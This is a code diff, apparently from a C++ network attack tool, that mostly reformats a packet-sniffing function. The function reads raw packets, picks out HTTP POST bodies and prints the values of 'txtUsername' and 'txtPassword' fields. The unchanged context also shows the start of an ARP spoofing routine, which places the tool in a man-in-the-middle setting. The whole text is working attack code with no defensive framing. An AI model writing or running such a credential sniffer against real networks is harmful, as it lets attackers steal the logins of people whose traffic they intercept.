@@ -366,11 +366,11 @@ void analyze_packet(){
     // Extract form data (usernames and passwords) from POST requests
     unsigned char buffer[2048];
     ssize_t length;
-    while(true){
+    while (true) {
         length = recvfrom(sock_raw_fd, buffer, 2048, 0, NULL, NULL);
-        if(length == -1){
+        if (length == -1) {
             cerr << "Error receiving packet." << endl;
-        }else{
+        } else {
             // Parse the packet
             struct ether_header *eth_header = (struct ether_header *)buffer;
             struct iphdr *ip_header = (struct iphdr *)(buffer + ETHER_HEADER_LEN);
@@ -378,20 +378,18 @@ void analyze_packet(){
             unsigned char *payload = buffer + ETHER_HEADER_LEN + ip_header->ihl * 4 + tcp_header->doff * 4;
             int payload_len = length - (ETHER_HEADER_LEN + ip_header->ihl * 4 + tcp_header->doff * 4);
             // Check if the packet is an HTTP POST request
-            if (payload_len > 0 && memcmp(payload, "POST", 4) == 0)
-            {
+            if (payload_len > 0 && strstr((char*)payload, "POST") != nullptr) {
+                cout << "HTTP POST request captured." << endl;
                 // Extract the form data (username and password)
                 string payload_str((char *)payload, payload_len);
                 size_t pos = payload_str.find("txtUsername=");
-                if (pos != string::npos)
-                {
+                if (pos != string::npos) {
                     size_t end_pos = payload_str.find("&", pos);
                     string username = payload_str.substr(pos + 12, end_pos - pos - 12);
                     cout << "Username: " << username << endl;
                 }
                 pos = payload_str.find("txtPassword=");
-                if (pos != string::npos)
-                {
+                if (pos != string::npos) {
                     size_t end_pos = payload_str.find("&", pos);
                     string password = payload_str.substr(pos + 12, end_pos - pos - 12);
                     cout << "Password: " << password << endl;
@@ -400,8 +398,8 @@ void analyze_packet(){
         }
     }
     close(sock_raw_fd);
-
 }
+    
 void arp_spoofing()
 {
     string gateway_mac = devices[gateway_ip];
